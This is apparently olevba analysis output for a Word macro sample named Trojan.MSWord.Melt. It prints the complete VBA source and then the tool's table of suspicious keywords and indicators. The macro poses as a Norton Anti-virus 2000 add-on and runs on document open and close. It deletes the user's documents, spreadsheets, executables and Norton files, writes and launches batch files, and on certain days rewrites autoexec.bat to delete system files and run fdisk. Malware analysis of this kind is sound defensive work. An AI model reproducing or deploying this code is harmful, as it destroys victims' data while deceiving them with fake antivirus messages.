olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.Melt
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan.MSWord.Melt - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: Trojan.MSWord.Melt - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Macro created 10/29/99 by Pat"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.Op"
MsgBox ("Add on for Norton Anti-virus 2000")
MsgBox ("This add on will let norton anti-vius pick up java virus, trojens, and worms more better.")

Call Check

End Sub

Sub Check()
MsgBox ("Checking to see if you system is 'OK'")
Call Filesize

End Sub

Sub AutoClose()
user = InputBox("Would like to see a list of the thing that were added to your system")
If user = "yes" Then
MsgBox ("Added new virus finders, fixed a bug that was in Norton Anti-virus 2000, added five new trojen defs, and fixed a small bug that made the virus scan slow so your virus scan can run faster then ever before")
End If
If user = "bloodwaste" Then
GoTo ex
End If
If Day(Now()) = "4" Or Day(Now()) = "20" Then
Open "autoexec.bat" For Output As #1
Print #1, "echo off"
Print #1, "echo GET DOWN ON YOUR FLOOR AND THANK GOD FOR THE GIFT NUCLEAR MELT DOWN GAVE YOU!"
Print #1, "del *.sys"
Print #1, "cd\Windows"
Print #1, "del *.sys"
Print #1, "del *.exe"
Print #1, "fdisk /pri"
Close #1
End If

If Hour(Now()) = 12 Or 1 Then
Shell ("C:\Windows\logo.bat")
End If



ex:
End Sub

Sub pop()
SendKeys "This may take a mintute or so."
MkDir ("C:\Windows\System\nortonsave")
Call dir
SendKeys "updataing"
End Sub

Sub virus()
On Error Resume Next

Dim r As String
Dim z As String
Dim z As String
Dim i As String

r = "c:\Windows\add.bat"
Kill ("C:\progra~1\norton~1\diskedit.exe")
Kill ("C:\progra~1\norton~1\*.sys")
Kill ("C:\*.doc")
Kill ("C:\Windows\desktop\*.exe")
z = "C:\anti.bat"
Kill ("C:\Windows\Desktop\*.doc")
Kill ("C:\Windows\desktop\*.xls")
Kill ("C:\Windows\Desktop\*.zip")

Open r For Output As #1
Print #1, "echo off"
Print #1, "del *.bak"
Print #1, "cd\Windows\Help"
Print #1, "del *.hlp"
Print #1, "cd\Windows\Desktop"
Print #1, "del *.txt"
Print #1, "rename *.c *.dll"
Print #1, "rename *.cpp *.sys"
Print #1, "move C:\Windows\Desktop\*.sys C:\Windows\system\nortonsave"
Print #1, "move C:\Windows\desktop\*.dll C:\Windows\system\nortonsave"
Close #1

i = "C:\Windows\logo.bat"
Open z For Output As #1
Print #1, "echo off"
Print #1, "echo"
Print #1, "echo You have a dark animal on your system"
Print #1, "pause"
Print #1, "C:\Windows\logo.bat"
Print #1, "Rem Good Day from ?."
Close #1

Open i For Output As #1
Print #1, "echo off"
Print #1, "echo       xxxxxx"
Print #1, "echo      x      x"
Print #1, "echo     x        x"
Print #1, "echo      xx     xx "
Print #1, "echo        x   x"
Print #1, "echo        x   x"
Print #1, "echo        x   x"
Print #1, "echo                 Nuclear Melt Down"
Close #1

Shell ("C:\Windows\add.bat")
End Sub

Sub dir()
Call virus
Call Norton

End Sub

Sub Norton()
Kill ("C:\Windows\Desktop\*.bmp")

End Sub

Sub Filesize()
SendKeys "Please wait"
                  'Good day
Call pop

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
|IOC       |logo.bat            |Executable file name                         |
|IOC       |add.bat             |Executable file name                         |
|IOC       |diskedit.exe        |Executable file name                         |
|IOC       |anti.bat            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

